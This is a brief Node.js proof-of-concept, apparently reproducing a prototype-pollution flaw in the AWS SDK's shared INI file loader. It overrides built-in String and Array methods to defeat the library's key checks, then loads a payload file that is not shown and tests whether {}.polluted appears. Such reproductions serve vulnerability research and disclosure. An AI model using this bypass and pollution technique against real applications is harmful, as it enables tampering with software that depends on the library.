String.prototype.includes = () => false;
String.prototype.startsWith = () => false;
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
console.log({}.polluted);
var fs = require('fs');
var sharedIniFileLoader = require('@aws-sdk/shared-ini-file-loader');
var parsed = sharedIniFileLoader.loadSharedConfigFiles({ filepath: './payload.toml' });
parsed.then(() => {
    console.log({}.polluted);
});